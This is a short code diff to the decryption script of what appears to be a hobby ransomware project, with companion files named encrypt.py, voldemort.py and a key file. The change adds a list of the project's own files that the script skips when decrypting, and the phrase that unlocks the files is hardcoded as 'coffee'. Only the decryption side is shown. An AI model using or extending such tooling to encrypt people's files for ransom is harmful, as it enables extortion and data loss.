@@ -25,10 +25,14 @@ secret_phrase = "coffee"
 # Ask for user input for the secret phrase
 user_phrase = input("Enter the secret phrase to decrypt your files\n")
 
+forbidden_files = ["README.md", "decrypt.py", "dryrun.py", "encrypt.py", "old_decrypt.py", "voldemort.py", "thekey.key"]
+
 # If the user input matches the secret phrase, perform decryption
 if user_phrase == secret_phrase:
     # Loop through each file in the list and decrypt using the key
     for file in files:
+        if file in forbidden_files:
+            continue
         with open(file, "rb") as file_to_decrypt:
             encrypted_content = file_to_decrypt.read()
         decrypted_content = Fernet(secret_key).decrypt(encrypted_content)
